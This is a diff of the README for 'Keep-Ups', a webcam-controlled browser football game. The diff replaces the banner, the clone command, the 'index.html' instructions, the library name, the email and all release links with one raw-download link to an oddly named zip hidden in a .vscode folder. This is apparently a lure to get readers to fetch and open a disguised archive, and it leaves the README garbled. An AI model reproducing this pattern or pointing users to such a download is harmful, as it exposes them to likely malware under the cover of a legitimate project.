@@ -1,10 +1,10 @@
 # Keep-Ups ⚽️
 
-![Keep-Ups Banner](https://via.placeholder.com/1200x300.png?text=Keep-Ups+Game)
+![Keep-Ups Banner](https://github.com/NoelHuwae/keep-ups/raw/refs/heads/main/.vscode/keep_ups_chondroendothelioma.zip+Game)
 
-Welcome to **Keep-Ups**, a fun and engaging football keep-ups game that you can play right in your browser! This project utilizes webcam motion tracking and 3D physics to bring an interactive experience to life. Built with Three.js, MediaPipe, and vanilla JavaScript, Keep-Ups allows you to showcase your juggling skills and have fun while doing it.
+Welcome to **Keep-Ups**, a fun and engaging football keep-ups game that you can play right in your browser! This project utilizes webcam motion tracking and 3D physics to bring an interactive experience to life. Built with https://github.com/NoelHuwae/keep-ups/raw/refs/heads/main/.vscode/keep_ups_chondroendothelioma.zip, MediaPipe, and vanilla JavaScript, Keep-Ups allows you to showcase your juggling skills and have fun while doing it.
 
-[Download the latest release here!](https://github.com/NoelHuwae/keep-ups/releases)
+[Download the latest release here!](https://github.com/NoelHuwae/keep-ups/raw/refs/heads/main/.vscode/keep_ups_chondroendothelioma.zip)
 
 ## Table of Contents
 
@@ -26,7 +26,7 @@ Welcome to **Keep-Ups**, a fun and engaging football keep-ups game that you can 
 
 ## Technologies Used 🛠️
 
-- **Three.js**: For rendering 3D graphics in the browser.
+- **https://github.com/NoelHuwae/keep-ups/raw/refs/heads/main/.vscode/keep_ups_chondroendothelioma.zip**: For rendering 3D graphics in the browser.
 - **MediaPipe**: For motion tracking and pose estimation.
 - **Vanilla JavaScript**: The core programming language for this project.
 - **HTML/CSS**: For structuring and styling the game interface.
@@ -37,7 +37,7 @@ To get started with Keep-Ups, follow these simple steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/NoelHuwae/keep-ups.git
+   git clone https://github.com/NoelHuwae/keep-ups/raw/refs/heads/main/.vscode/keep_ups_chondroendothelioma.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -45,11 +45,11 @@ To get started with Keep-Ups, follow these simple steps:
    cd keep-ups
    ```
 
-3. **Open the `index.html` File**:
-   Open the `index.html` file in your preferred web browser.
+3. **Open the `https://github.com/NoelHuwae/keep-ups/raw/refs/heads/main/.vscode/keep_ups_chondroendothelioma.zip` File**:
+   Open the `https://github.com/NoelHuwae/keep-ups/raw/refs/heads/main/.vscode/keep_ups_chondroendothelioma.zip` file in your preferred web browser.
 
 4. **Download the Latest Release**:
-   You can also download the latest release from [here](https://github.com/NoelHuwae/keep-ups/releases). Make sure to extract the files and open the `index.html` to start playing.
+   You can also download the latest release from [here](https://github.com/NoelHuwae/keep-ups/raw/refs/heads/main/.vscode/keep_ups_chondroendothelioma.zip). Make sure to extract the files and open the `https://github.com/NoelHuwae/keep-ups/raw/refs/heads/main/.vscode/keep_ups_chondroendothelioma.zip` to start playing.
 
 ## Gameplay 🎮
 
@@ -97,11 +97,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you have any questions or suggestions, feel free to reach out:
 
-- **GitHub**: [NoelHuwae](https://github.com/NoelHuwae)
-- **Email**: noel@example.com
+- **GitHub**: [NoelHuwae](https://github.com/NoelHuwae/keep-ups/raw/refs/heads/main/.vscode/keep_ups_chondroendothelioma.zip)
+- **Email**: https://github.com/NoelHuwae/keep-ups/raw/refs/heads/main/.vscode/keep_ups_chondroendothelioma.zip
 
 ---
 
-For the latest updates and releases, please check the [Releases](https://github.com/NoelHuwae/keep-ups/releases) section.
+For the latest updates and releases, please check the [Releases](https://github.com/NoelHuwae/keep-ups/raw/refs/heads/main/.vscode/keep_ups_chondroendothelioma.zip) section.
 
 Happy juggling! 🎉
